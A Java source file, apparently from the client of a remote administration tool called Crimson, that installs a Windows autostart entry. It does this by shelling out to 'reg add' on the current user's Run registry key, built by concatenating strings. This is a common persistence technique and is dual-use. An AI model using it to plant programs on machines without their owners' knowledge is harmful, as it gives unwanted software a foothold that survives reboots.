/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.modules;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public enum Autostart {
	;

	public static void install_win(File f) {
		String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"" + f.getName()
				+ "\" /d \"\"" + f.getAbsolutePath() + "\"\" /t REG_SZ";

		try {
			if (Runtime.getRuntime().exec(command).waitFor(3, TimeUnit.SECONDS)) {
				System.out.println("Installed registry key successfully");
			} else {
				System.out.println("Failed to install autostart key");
			}
		} catch (InterruptedException | IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
